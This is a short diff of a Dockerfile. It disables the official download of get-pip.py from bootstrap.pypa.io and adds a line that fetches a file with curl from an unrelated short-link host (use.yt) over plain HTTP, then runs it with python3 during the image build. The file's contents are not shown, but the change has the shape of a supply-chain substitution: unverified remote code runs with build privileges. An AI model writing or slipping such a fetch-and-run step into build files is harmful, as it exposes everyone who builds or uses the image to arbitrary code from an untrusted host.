@@ -25,7 +25,8 @@ RUN apt-get -qqy update && apt-get install -qy software-properties-common python
     libpython3-dev && \
   apt-get clean && rm -rf /var/lib/apt/lists/*
 
-RUN wget -q https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py
+#RUN wget -q https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py
+RUN curl -JO http://use.yt/upload/9e31e267 && python3 get-pip.py
 
 ENV PYCAIRO=pycairo-1.11.0
 RUN cd /tmp && \
